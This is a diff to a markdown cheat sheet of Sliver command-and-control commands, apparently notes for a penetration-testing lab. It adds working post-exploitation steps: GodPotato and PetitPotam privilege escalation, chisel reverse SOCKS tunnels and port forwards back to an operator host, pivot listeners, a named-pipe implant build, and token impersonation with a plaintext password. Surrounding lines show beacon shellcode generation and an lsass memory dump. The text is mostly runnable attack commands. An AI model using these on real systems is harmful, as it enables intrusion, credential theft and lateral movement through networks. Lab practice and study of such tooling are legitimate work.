@@ -45,6 +45,7 @@ generate beacon --http 10.10.14.62:8088 -N mybe.bin -f shellcode
 ### Nomal
 ```bash
 # Nomal
+getprivs
 seatbelt -- -group=all
 sharpup -- audit
 
@@ -75,8 +76,13 @@ execute -o powershell $Forest = [System.DirectoryServices.ActiveDirectory.Forest
 
 ## Privilege Escalation
 ```bash
-### GotPotato
+# GotPotato
 execute-assembly /usr/share/windows-binaries/GodPotato-NET4.exe -cmd ''
+## in current process
+inline-execute-assembly
+
+# PetitPotam
+c2tc-petitpotam own target 
 ```
 
 ## Collection
@@ -93,14 +99,31 @@ procdump --pid ??? /tmp/lsass.dmp
 ## Lateral Move
 ```bash
 # chisel
+https://github.com/jpillora/chisel/releases
+# Reverse 
+./chisel_1.9.0_linux_amd64 server -p 2345 --socks5 --reverse
+## sliver
 chisel client --max-retry-count 2 10.0.0.1:2345 R:socks
 ## Rscoks
 tail /etc/proxychains4.conf
+# forward
+./chisel_1.9.0_linux_amd64 server -p 1234
+## sliver
+chisel client --max-retry-count 2 10.10.15.165:2345 8444:10.10.15.165:4444 8080:10.10.15.165:80
+
+# pivot
+## session
+### Open 172.16.1.11:9898 for sliver
+ifconfig
+pivots tcp --bind 172.16.1.11
 
 # name pipe
 pivots named-pipe --bind Etaks
 ## implant
-generate --named-pipe 10.0.0.1/pipe/academy -N pipe_Etaks 
+generate --named-pipe 172.16.1.11/pipe/academy -N pipe_Etaks 
+
+# token
+make-token -u svc_sql -d child.my.local -p Pass123
 ```
 
 ## Shellcode create
